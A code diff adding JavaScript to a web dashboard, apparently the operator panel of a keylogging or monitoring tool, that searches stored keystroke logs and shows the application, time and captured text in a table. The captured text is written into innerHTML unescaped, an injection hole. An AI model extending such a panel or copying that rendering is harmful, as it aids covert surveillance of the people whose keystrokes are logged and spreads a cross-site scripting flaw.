@@ -69,6 +69,65 @@ function showSection(sectionId) {
     }
 }
 
+async function searchKeylogs() {
+    const searchInput = document.getElementById('search-keylogs');
+    const searchResults = document.getElementById('search-results-keylogs');
+    const searchTerm = searchInput.value.trim();
+
+    if (!searchTerm) {
+        searchResults.innerHTML = '';
+        return;
+    }
+
+    try {
+        const response = await fetch('/search_keylogs', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: `search_term=${encodeURIComponent(searchTerm)}`
+        });
+
+        if (!response.ok) throw new Error('Search request failed');
+        
+        const results = await response.json();
+        displayKeylogSearchResults(results);
+    } catch (error) {
+        console.error('Error searching keylogs:', error);
+        searchResults.innerHTML = '<p class="error">Error searching keylogs</p>';
+    }
+}
+
+function displayKeylogSearchResults(results) {
+    const searchResults = document.getElementById('search-results-keylogs');
+    if (!results.length) {
+        searchResults.innerHTML = '<p>No results found</p>';
+        return;
+    }
+
+    const resultsList = results.map(result => `
+        <tr>
+            <td>${result.application}</td>
+            <td>${result.time}</td>
+            <td>${result.text}</td>
+        </tr>
+    `).join('');
+
+    searchResults.innerHTML = `
+        <table>
+            <thead>
+                <tr>
+                    <th>Application</th>
+                    <th>Time</th>
+                    <th>Text</th>
+                </tr>
+            </thead>
+            <tbody>
+                ${resultsList}
+            </tbody>
+        </table>
+    `;
+}
 async function searchMessages() {
     const searchInput = document.getElementById('search-input');
     const searchResults = document.getElementById('search-results');
